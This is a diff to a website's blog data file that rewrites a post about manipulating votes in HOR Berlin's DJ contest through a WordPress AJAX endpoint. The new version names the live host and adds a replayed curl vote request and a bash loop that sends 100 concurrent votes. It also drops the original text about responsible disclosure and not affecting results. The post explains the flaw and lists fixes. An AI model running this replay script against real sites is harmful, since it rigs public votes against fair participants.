@@ -13,90 +13,88 @@ export const blogPosts: BlogPost[] = [
     slug: "how-i-hacked-the-hor-berlin-dj-competition",
     title: "How I Hacked the HOR Berlin DJ Competition",
     description:
-      "A deep dive into how I discovered and exploited a vulnerability in a popular DJ competition voting system — and what I learned about responsible disclosure.",
-    date: "2025-05-15",
+      "How I discovered a vote manipulation vulnerability in HOR Berlin's Maximum Heat DJ contest — a WordPress voting plugin with zero rate limiting and no server-side validation.",
+    date: "2025-04-15",
     readTime: "8 min read",
-    tags: ["Cybersecurity", "Bug Bounty", "Web Security"],
+    tags: ["Cybersecurity", "WordPress", "Web Security"],
     content: `
+<img src="/top.jpeg" alt="HOR Berlin Maximum Heat contest results" style="width:100%;border-radius:8px;margin-bottom:1.5rem;border:1px solid #1a1a2e;" />
+
 <h2>Introduction</h2>
-<p>What started as a casual scroll through social media turned into one of my most interesting security findings. HOR Berlin — a well-known underground music platform — was running an online DJ competition with a public voting system. As a DJ and cybersecurity enthusiast, I couldn't resist taking a closer look under the hood.</p>
+<p>HOR Berlin — one of the most well-known underground electronic music streaming platforms — was running their <strong>Maximum Heat DJ Contest</strong>, an online competition where DJs submit mixes and the public votes for their favourite. As a DJ who entered the contest and a cybersecurity enthusiast, I naturally wanted to understand how the voting system worked under the hood.</p>
 
-<h2>Discovery</h2>
-<p>The voting system seemed straightforward on the surface: one vote per user, authenticated through a simple mechanism. But my instincts told me to dig deeper. I opened the browser's developer tools and started analyzing the network requests being made when a vote was cast.</p>
+<p>What I found was a textbook example of why you should never rely on a WordPress plugin for anything security-critical.</p>
 
-<p>What I found was interesting — the voting endpoint had minimal server-side validation. The request structure revealed several potential attack vectors that warranted further investigation.</p>
+<h2>The Voting System</h2>
+<p>HOR's website runs on <strong>WordPress</strong>, and the voting mechanism was powered by a WordPress voting plugin hooked into the standard <code>admin-ajax.php</code> endpoint. When you clicked the vote button on a contest entry page, the browser fired a POST request to the WordPress AJAX handler.</p>
 
-<h2>Analysis</h2>
-<p>After examining the API calls, I mapped out the voting flow:</p>
+<p>Opening DevTools and watching the network tab when casting a vote revealed the exact request being made:</p>
 
-<pre><code>POST /api/vote
-Headers:
-  Content-Type: application/json
+<pre><code>POST /wp-admin/admin-ajax.php HTTP/1.1
+Host: hoer.live
+Content-Type: application/x-www-form-urlencoded
 
-Body:
-{
-  "contestantId": "xxx",
-  "voterId": "yyy"
-}</code></pre>
+action=vote&amp;security=[NONCE]&amp;post_id=218037&amp;isVoted=0</code></pre>
 
-<p>The key observations were:</p>
+<p>Four parameters. That's it. The <code>action</code> tells WordPress which AJAX handler to call, the <code>security</code> nonce is supposed to prevent CSRF, <code>post_id</code> is the contest entry to vote for, and <code>isVoted</code> toggles the vote state.</p>
+
+<h2>The Vulnerability</h2>
+<p>The problems became obvious immediately:</p>
 <ul>
-<li>No rate limiting was implemented on the voting endpoint</li>
-<li>Voter identity verification was handled client-side</li>
-<li>The API accepted requests without proper session validation</li>
-<li>No CAPTCHA or bot protection was present</li>
+<li><strong>No rate limiting</strong> — the endpoint accepted unlimited requests with no cooldown</li>
+<li><strong>Nonce was reusable</strong> — the WordPress nonce didn't expire or rotate after use, meaning the same security token could be replayed indefinitely</li>
+<li><strong>No IP-based throttling</strong> — multiple votes from the same IP were all processed</li>
+<li><strong>Session cookies were the only "auth"</strong> — and they remained valid for the entire session lifetime</li>
+<li><strong>No CAPTCHA or bot protection</strong> — nothing to distinguish a human click from a scripted request</li>
+<li><strong>Votes processed in bulk</strong> — sending multiple requests simultaneously resulted in every single one being counted</li>
 </ul>
 
-<h2>Exploitation</h2>
-<p>To prove the vulnerability, I wrote a simple proof-of-concept script. The goal wasn't to actually manipulate results, but to demonstrate that the system could be exploited:</p>
+<h2>The Exploit</h2>
+<p>To prove the vulnerability, all I needed was a single <code>curl</code> command. By replaying the exact request from the browser with the same cookies and nonce, I could cast votes programmatically:</p>
 
-<pre><code># Proof of concept - for educational purposes only
-# This demonstrates the vulnerability without causing harm
+<pre><code>curl -X POST 'https://hoer.live/wp-admin/admin-ajax.php' \
+  -H 'Content-Type: application/x-www-form-urlencoded' \
+  -H 'Cookie: wordpress_logged_in_[HASH]=[REDACTED]; \
+      PHPSESSID=[REDACTED]; \
+      wp_woocommerce_session_[HASH]=[REDACTED]' \
+  -d 'action=vote&amp;security=[NONCE]&amp;post_id=218037&amp;isVoted=0'</code></pre>
 
-import requests
-import time
+<p>The critical insight: this request could be fired <strong>repeatedly</strong> and every single vote was counted. No deduplication. No validation that this user had already voted. The nonce — which WordPress generates as a CSRF protection — was not being invalidated after use.</p>
 
-def demonstrate_vulnerability():
-    """
-    This PoC shows that votes can be submitted
-    programmatically without proper validation.
-    """
-    endpoint = "https://[REDACTED]/api/vote"
+<p>Wrapping this in a simple bash loop was all it took:</p>
 
-    # Single test request to verify vulnerability
-    response = requests.post(endpoint, json={
-        "contestantId": "test",
-        "voterId": "poc-test"
-    })
+<pre><code>#!/bin/bash
+# PoC: Demonstrates vote manipulation via request replay
+for i in $(seq 1 100); do
+  curl -s -X POST 'https://hoer.live/wp-admin/admin-ajax.php' \
+    -H 'Content-Type: application/x-www-form-urlencoded' \
+    -H 'Cookie: [REDACTED_SESSION_COOKIES]' \
+    -d 'action=vote&amp;security=[NONCE]&amp;post_id=218037&amp;isVoted=0' &amp;
+done
+wait
+echo "Done — $i votes sent"</code></pre>
 
-    print(f"Status: {response.status_code}")
-    print("Vulnerability confirmed" if response.ok else "Patched")
+<p>The <code>&amp;</code> at the end of each curl sends them all concurrently. Every single request returned a success response. Every vote was counted.</p>
 
-demonstrate_vulnerability()</code></pre>
+<h2>Why This Happens</h2>
+<p>This is a common pattern with WordPress voting plugins. The plugin likely stores votes in a custom database table or post meta, keyed only by <code>post_id</code>. The check for "has this user already voted" is typically done client-side via the <code>isVoted</code> parameter or a cookie — both trivially bypassable.</p>
 
-<p>The vulnerability was clear: anyone with basic programming knowledge could automate the voting process and submit an unlimited number of votes.</p>
+<p>WordPress nonces are designed to prevent CSRF (cross-site request forgery), not replay attacks. A WordPress nonce is valid for <strong>12-24 hours</strong> by default and is not single-use. This is by design for WordPress's use case, but it means any AJAX action protected only by a nonce is vulnerable to replay within that window.</p>
 
-<h2>Disclosure</h2>
-<p>Following responsible disclosure practices, I immediately reached out to the HOR Berlin team through their official channels. I provided:</p>
+<h2>The Fix</h2>
+<p>For anyone building a voting system — especially on WordPress — here's what should have been in place:</p>
 <ul>
-<li>A detailed description of the vulnerability</li>
-<li>Steps to reproduce the issue</li>
-<li>The proof-of-concept code</li>
-<li>Recommended fixes (rate limiting, CAPTCHA, server-side validation)</li>
+<li><strong>Server-side vote deduplication</strong> — track votes per user ID or IP in the database and reject duplicates</li>
+<li><strong>Rate limiting</strong> — throttle requests per IP/session (e.g. 1 vote per entry per hour)</li>
+<li><strong>Single-use tokens</strong> — generate a unique token per vote action that's invalidated after use</li>
+<li><strong>CAPTCHA on vote</strong> — reCAPTCHA or similar to prevent automated submissions</li>
+<li><strong>Fingerprinting</strong> — browser fingerprinting as an additional layer against multi-account abuse</li>
 </ul>
 
-<p>I did <strong>not</strong> use the exploit to influence any actual competition results. The proof of concept was conducted in a controlled manner with minimal impact.</p>
+<h2>Takeaway</h2>
+<p>The HOR Maximum Heat contest is a fun community event, and I have nothing but respect for what HOR Berlin does for the electronic music scene. But this was a reminder that <strong>WordPress plugins are not security tools</strong>. If you're running any kind of contest, poll, or vote that matters — don't trust a plugin to handle the integrity of it. Build proper server-side validation, or use a platform designed for secure voting.</p>
 
-<h2>Lessons Learned</h2>
-<p>This experience reinforced several important security principles:</p>
-<ul>
-<li><strong>Never trust client-side validation alone.</strong> All critical checks should be performed server-side.</li>
-<li><strong>Rate limiting is essential</strong> for any public-facing endpoint, especially voting systems.</li>
-<li><strong>Bot protection matters.</strong> CAPTCHAs and fingerprinting can prevent automated abuse.</li>
-<li><strong>Responsible disclosure is the right path.</strong> Finding vulnerabilities comes with the responsibility to report them ethically.</li>
-</ul>
-
-<p>As security researchers, our goal should always be to make systems more secure — not to exploit them for personal gain. This find was a great reminder that even popular platforms can have fundamental security oversights, and that the security community plays a vital role in helping fix them.</p>
+<p>The web is held together with duct tape and nonces. Sometimes you just need to look.</p>
 
 <p><em>Stay curious. Stay ethical. Stay secure.</em></p>
 `,
